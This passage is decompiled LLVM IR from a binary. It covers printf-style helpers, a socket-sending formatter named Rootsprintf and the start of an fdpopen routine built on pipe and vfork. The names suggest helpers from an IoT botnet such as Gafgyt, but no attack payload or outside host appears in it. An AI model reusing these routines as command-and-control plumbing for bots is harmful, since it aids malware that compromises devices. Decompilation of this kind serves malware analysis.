  br i1 %v2_8884, label %dec_label_pc_88e8, label %dec_label_pc_888c

dec_label_pc_888c:                                ; preds = %dec_label_pc_8880
  %v3_888c = load i32, i32* %stack_var_0, align 4
  %v2_8890 = icmp eq i32 %v3_888c, 0
  br i1 %v2_8890, label %dec_label_pc_88d0, label %dec_label_pc_8898

dec_label_pc_8898:                                ; preds = %dec_label_pc_888c
  %v1_889c = and i32 %arg6, 2
  %v2_88a0 = icmp eq i32 %v1_889c, 0
  br i1 %v2_88a0, label %dec_label_pc_88d0, label %dec_label_pc_88a8

dec_label_pc_88a8:                                ; preds = %dec_label_pc_8898
  %v2_88b0 = inttoptr i32 %arg1 to i32*
  %v3_88b0 = call i32 @printchar(i32* %v2_88b0, i32 45)
  %v3_88c0 = load i32, i32* %stack_var_0, align 4
  %v1_88c4 = add i32 %v3_88c0, -1
  store i32 %v1_88c4, i32* %stack_var_0, align 4
  br label %dec_label_pc_88e8

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8898, %dec_label_pc_888c
  %v4_88d0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88d4 = add i32 %v4_88d0, -1
  %v5_88d8 = inttoptr i32 %v1_88d4 to i8*
  store i8 45, i8* %v5_88d8, align 1
  br label %dec_label_pc_88e8

dec_label_pc_88e8:                                ; preds = %dec_label_pc_8880, %dec_label_pc_88a8, %dec_label_pc_88d0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8880 ], [ %v5_88d8, %dec_label_pc_88d0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88a8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8880 ], [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88a8 ]
  %v3_88f0 = load i32, i32* %stack_var_0, align 4
  %v6_88f8 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_88f0, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8904 = add i32 %v6_88f8, %stack_var_-56.0
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_8778, %dec_label_pc_88e8
  %storemerge2 = phi i32 [ %v2_8904, %dec_label_pc_88e8 ], [ %v6_879c, %dec_label_pc_8778 ]
  store i32 %v3_8738, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8840, { 0, 2, 1 }
  uselistorder i32 %v3_880c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8838, { 1, 0 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35116, i32* %stack_var_-4, align 4
  %v2_8928 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8928, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cd429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cd831 = icmp eq i8 %v2_8cd429, 0
  br i1 %v2_8cd831, label %dec_label_pc_8ce0, label %dec_label_pc_8948.lr.ph

dec_label_pc_8948.lr.ph:                          ; preds = %entry
  %v5_8c8c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8948.lr.ph, %dec_label_pc_8cc4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8948.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8cc4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8948.lr.ph ], [ %v1_8cc8, %dec_label_pc_8cc4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8948.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8cc4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8948.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_894c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8950 = icmp eq i8 %v2_894c, 37
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8ca4

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v1_895c = add i32 %stack_var_-32.4.in34, 1
  %v5_8960 = inttoptr i32 %v1_895c to i8*
  %v2_8978 = load i8, i8* %v5_8960, align 1
  %v2_897c = icmp eq i8 %v2_8978, 0
  br i1 %v2_897c, label %dec_label_pc_8ce0, label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8958
  %v2_8988 = load i8, i8* %v5_8960, align 1
  %v7_898c = icmp eq i8 %v2_8988, 37
  br i1 %v7_898c, label %dec_label_pc_8ca4, label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8984
  %v2_8998 = load i8, i8* %v5_8960, align 1
  %v7_899c = icmp eq i8 %v2_8998, 45
  br i1 %v7_899c, label %dec_label_pc_89a4, label %dec_label_pc_89d4.preheader

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8994
  %v1_89a8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89ac = inttoptr i32 %v1_89a8 to i8*
  br label %dec_label_pc_89d4.preheader

dec_label_pc_89d4.preheader:                      ; preds = %dec_label_pc_89a4, %dec_label_pc_8994
  %stack_var_-32.0.ph = phi i8* [ %v5_8960, %dec_label_pc_8994 ], [ %v5_89ac, %dec_label_pc_89a4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8994 ], [ 1, %dec_label_pc_89a4 ]
  %v4_89d42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89d83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89dc7 = icmp eq i8 %v2_89d83, 48
  br i1 %v7_89dc7, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89d4.preheader, %dec_label_pc_89bc
  %v4_89d49 = phi i32 [ %v1_89c0, %dec_label_pc_89bc ], [ %v4_89d42, %dec_label_pc_89d4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89cc, %dec_label_pc_89bc ], [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ]
  %v1_89c0 = add i32 %v4_89d49, 1
  %v5_89c4 = inttoptr i32 %v1_89c0 to i8*
  %v1_89cc = or i32 %stack_var_-48.08, 2
  %v2_89d8 = load i8, i8* %v5_89c4, align 1
  %v7_89dc = icmp eq i8 %v2_89d8, 48
  br i1 %v7_89dc, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_89d4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ], [ %v1_89cc, %dec_label_pc_89bc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89d4.preheader ], [ %v5_89c4, %dec_label_pc_89bc ]
  %v4_8a2011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a2412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a2412, 48
  br i1 %tmp60, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_89e8:                                ; preds = %dec_label_pc_8a30
  %v2_89f4 = mul i32 %stack_var_-52.019, 10
  %v2_8a00 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  %v1_8a04 = add i32 %v2_89f4, -48
  %v2_8a0c = add i32 %v1_8a04, %v3_8a00
  %v1_8a18 = add i32 %v4_8a2021, 1
  %v5_8a1c = inttoptr i32 %v1_8a18 to i8*
  %v2_8a24 = load i8, i8* %v5_8a1c, align 1
  %tmp61 = icmp ult i8 %v2_8a24, 48
  br i1 %tmp61, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_89e8
  %v4_8a2021 = phi i32 [ %v1_8a18, %dec_label_pc_89e8 ], [ %v4_8a2011, %dec_label_pc_8a20.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a0c, %dec_label_pc_89e8 ], [ 0, %dec_label_pc_8a20.preheader ]
  %v2_8a34 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a34, 58
  br i1 %tmp62, label %dec_label_pc_89e8, label %dec_label_pc_8a40

dec_label_pc_8a40:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a20.preheader ], [ %v2_8a0c, %dec_label_pc_89e8 ], [ %stack_var_-52.019, %dec_label_pc_8a30 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ], [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.120, %dec_label_pc_8a30 ]
  %v2_8a44 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a48 = icmp eq i8 %v2_8a44, 115
  br i1 %v7_8a48, label %dec_label_pc_8a50, label %dec_label_pc_8ab4

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40
  %v1_8a54 = add i32 %stack_var_-36.133, 4
  %v1_8a60 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a60 = load i32, i32* %v1_8a60, align 4
  %v2_8a6c = icmp eq i32 %v2_8a60, 0
  br i1 %v2_8a6c, label %dec_label_pc_8a80, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a50
  %v5_8a78 = inttoptr i32 %v2_8a60 to i8*
  br label %dec_label_pc_8a88

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a50
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8a80
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbec.31, i32 0, i32 0), %dec_label_pc_8a80 ], [ %v5_8a78, %dec_label_pc_8a74 ]
  %v7_8a9c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8aa8 = add i32 %v7_8a9c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8a40
  %v2_8ab8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 100
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8b18

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-36.133, 4
  %v1_8ad4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ad4 = load i32, i32* %v1_8ad4, align 4
  %v7_8b00 = call i32 @printi(i32 %tmp, i32 %v2_8ad4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b0c = add i32 %v7_8b00, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8ab4
  %v2_8b1c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 120
  br i1 %v7_8b20, label %dec_label_pc_8b28, label %dec_label_pc_8b7c

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v1_8b2c = add i32 %stack_var_-36.133, 4
  %v1_8b38 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b38 = load i32, i32* %v1_8b38, align 4
  %v7_8b64 = call i32 @printi(i32 %tmp, i32 %v2_8b38, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b70 = add i32 %v7_8b64, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b18
  %v2_8b80 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b84 = icmp eq i8 %v2_8b80, 88
  br i1 %v7_8b84, label %dec_label_pc_8b8c, label %dec_label_pc_8be0

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b7c
  %v1_8b90 = add i32 %stack_var_-36.133, 4
  %v1_8b9c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b9c = load i32, i32* %v1_8b9c, align 4
  %v7_8bc8 = call i32 @printi(i32 %tmp, i32 %v2_8b9c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bd4 = add i32 %v7_8bc8, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b7c
  %v2_8be4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8be8 = icmp eq i8 %v2_8be4, 117
  br i1 %v7_8be8, label %dec_label_pc_8bf0, label %dec_label_pc_8c44

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8be0
  %v1_8bf4 = add i32 %stack_var_-36.133, 4
  %v1_8c00 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c00 = load i32, i32* %v1_8c00, align 4
  %v7_8c2c = call i32 @printi(i32 %tmp, i32 %v2_8c00, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c38 = add i32 %v7_8c2c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8be0
  %v2_8c48 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c4c = icmp eq i8 %v2_8c48, 99
  br i1 %v7_8c4c, label %dec_label_pc_8c54, label %dec_label_pc_8cc4

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c44
  %v1_8c58 = add i32 %stack_var_-36.133, 4
  %v1_8c64 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c64 = load i32, i32* %v1_8c64, align 4
  %v1_8c68 = urem i32 %v2_8c64, 256
  store i32 %v1_8c68, i32* %stack_var_-18, align 4
  %v6_8c8c = call i32 @prints(i32 %tmp, i8* %v5_8c8c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c58)
  %v2_8c98 = add i32 %v6_8c8c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8948, %dec_label_pc_8984
  %stack_var_-32.2 = phi i8* [ %v5_8960, %dec_label_pc_8984 ], [ %stack_var_-32.435, %dec_label_pc_8948 ]
  %v2_8ca8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8ca8 = zext i8 %v2_8ca8 to i32
  %v3_8cb4 = call i32 @printchar(i32* %arg1, i32 %v3_8ca8)
  %v1_8cbc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8c44, %dec_label_pc_8c54, %dec_label_pc_8bf0, %dec_label_pc_8b8c, %dec_label_pc_8b28, %dec_label_pc_8a88, %dec_label_pc_8ac4, %dec_label_pc_8ca4
  %stack_var_-44.0 = phi i32 [ %v1_8cbc, %dec_label_pc_8ca4 ], [ %v2_8aa8, %dec_label_pc_8a88 ], [ %v2_8b0c, %dec_label_pc_8ac4 ], [ %v2_8b70, %dec_label_pc_8b28 ], [ %v2_8bd4, %dec_label_pc_8b8c ], [ %v2_8c38, %dec_label_pc_8bf0 ], [ %v2_8c98, %dec_label_pc_8c54 ], [ %stack_var_-44.132, %dec_label_pc_8c44 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8ca4 ], [ %v1_8a54, %dec_label_pc_8a88 ], [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v1_8b2c, %dec_label_pc_8b28 ], [ %v1_8b90, %dec_label_pc_8b8c ], [ %v1_8bf4, %dec_label_pc_8bf0 ], [ %v1_8c58, %dec_label_pc_8c54 ], [ %stack_var_-36.133, %dec_label_pc_8c44 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8a88 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ac4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b28 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b8c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bf0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c54 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c44 ]
  %v4_8cc4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8cc8 = add i32 %v4_8cc4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8cc8 to i8*
  %v2_8cd4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cd8 = icmp eq i8 %v2_8cd4, 0
  br i1 %v2_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8948

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8958, %dec_label_pc_8cc4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8958 ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_8ce4 = icmp eq i32* %arg1, null
  br i1 %v2_8ce4, label %dec_label_pc_8cfc, label %dec_label_pc_8cec

dec_label_pc_8cec:                                ; preds = %dec_label_pc_8ce0
  %v2_8cf0 = load i32, i32* %arg1, align 4
  %v3_8cf8 = inttoptr i32 %v2_8cf0 to i8*
  store i8 0, i8* %v3_8cf8, align 1
  br label %dec_label_pc_8cfc

dec_label_pc_8cfc:                                ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cec
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89c0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8960, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8ce0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cc4, { 7, 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_8ca4, { 1, 0 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_89bc, { 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8d18 = load i32, i32* @r1, align 4
  store i32 %v6_8d18, i32* %stack_var_-12, align 4
  %v3_8d1c = load i32, i32* @fp, align 4
  store i32 36132, i32* %stack_var_-20, align 4
  %v2_8d20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d20, i32* @fp, align 4
  %v4_8d2c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d40 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d2c)
  store i32 %v3_8d1c, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d60 = load i32, i32* @fp, align 4
  store i32 36200, i32* %stack_var_-16, align 4
  %v2_8d64 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d70 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d88 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d70)
  store i32 %v3_8d60, i32* @fp, align 4
  ret i32 %v4_8d88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8da8 = load i32, i32* @fp, align 4
  store i32 36272, i32* %stack_var_-16, align 4
  %v2_8dac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dac, i32* @fp, align 4
  %v1_8dbc = call i32 @malloc(i32 2048)
  store i32 %v1_8dbc, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8dd8 = inttoptr i32 %v1_8dbc to i8*
  %v3_8dd8 = call i32 @__GI_memset(i8* %v2_8dd8, i32 0)
  %v2_8de4 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e04 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8de4)
  %v3_8e0c = call i32 @strlen(i8* %v2_8dd8)
  %v2_8e1c = add i32 %v3_8e0c, %v1_8dbc
  %v3_8e24 = inttoptr i32 %v2_8e1c to i8*
  store i8 10, i8* %v3_8e24, align 1
  %v3_8e2c = call i32 @strlen(i8* %v2_8dd8)
  %v4_8e44 = call i32 @__libc_send(i32 %arg1, i32 %v1_8dbc, i32 %v3_8e2c, i32 16384)
  store i32 %v1_8dbc, i32* @r0, align 4
  %v0_8e54 = call i32 @free()
  store i32 %v3_8da8, i32* @fp, align 4
  ret i32 %v4_8e44

; uselistorder directives
  uselistorder i8* %v2_8dd8, { 1, 0, 2 }
  uselistorder i32 %v1_8dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e70 = load i32, i32* @fp, align 4
  store i32 36472, i32* %stack_var_-4, align 4
  %v2_8e74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e74, i32* @fp, align 4
  %v2_8e88 = load i8, i8* %arg2, align 1
  %v7_8e8c = icmp eq i8 %v2_8e88, 114
  br i1 %v7_8e8c, label %dec_label_pc_8ea4, label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %entry
  %v2_8e98 = load i8, i8* %arg2, align 1
  %v7_8e9c = icmp eq i8 %v2_8e98, 119
  br i1 %v7_8e9c, label %dec_label_pc_8ea4, label %dec_label_pc_8eb8

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e94, %entry
  %v1_8ea8 = add i32 %tmp, 1
  %v1_8eac = inttoptr i32 %v1_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v2_8eb0 = icmp eq i8 %v2_8eac, 0
  br i1 %v2_8eb0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8ea4
  br label %dec_label_pc_90d0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8ea4
  %v2_8ec4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8ecc = call i32 @__GI_pipe(i32 %v2_8ec4)
  store i32 %v1_8ecc, i32* @r0, align 4
  %v1_8ed4 = icmp slt i32 %v1_8ecc, 0
  br i1 %v1_8ed4, label %dec_label_pc_8edc, label %dec_label_pc_8ee8

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec4
  br label %dec_label_pc_90d0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec4
  %v2_8eec = load i32, i32* @global_var_2a4b8.33, align 4
  %v2_8ef0 = icmp eq i32 %v2_8eec, 0
  br i1 %v2_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_8f78

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v0_8ef8 = call i32 @getdtablesize()
  %v5_8f0c = icmp sgt i32 %v0_8ef8, 0
  br i1 %v5_8f0c, label %dec_label_pc_8f1c, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_90d0

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v3_8f20 = mul i32 %v0_8ef8, 4
  %v1_8f28 = call i32 @malloc(i32 %v3_8f20)
  store i32 %v1_8f28, i32* @global_var_2a4b8.33, align 4
  %v2_8f44 = icmp eq i32 %v1_8f28, 0
  br i1 %v2_8f44, label %dec_label_pc_8f4c, label %dec_label_pc_8f58

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f1c
  br label %dec_label_pc_90d0

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f1c
  store i32 %v3_8f20, i32* @r2, align 4
  %v2_8f74 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f74 = call i32 @__GI_memset(i8* %v2_8f74, i32 0)
  store i32 %v3_8f74, i32* @r0, align 4
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f58
  %v0_8f78 = call i32 @__vfork()
  %v7_8f90 = icmp eq i32 %v0_8f78, -1
  br i1 %v7_8f90, label %dec_label_pc_8fa8, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f78
  %v2_8f9c = icmp eq i32 %v0_8f78, 0
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_906c

dec_label_pc_8fa8:                                ; preds = %dec_label_pc_8f78
  %v3_8fa8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fb0 = call i32 @__GI_close(i32 %v3_8fa8)
  %v1_8fbc = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90d0

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8f98
  %v3_8fd0 = load i8, i8* %arg2, align 1
  %v7_8fd4 = icmp eq i8 %v3_8fd0, 114
  br i1 %v7_8fd4, label %dec_label_pc_8fdc, label %dec_label_pc_9014

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fcc
  %v7_8fe0 = icmp eq i32 %tmp3, 1
  br i1 %v7_8fe0, label %dec_label_pc_9004, label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fdc
  %v4_8ff4 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  %v1_9000 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9004

dec_label_pc_9004:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8fe8
  %v3_9004 = load i32, i32* %stack_var_-32, align 4
  %v1_900c = call i32 @__GI_close(i32 %v3_9004)
  br label %dec_label_pc_9048

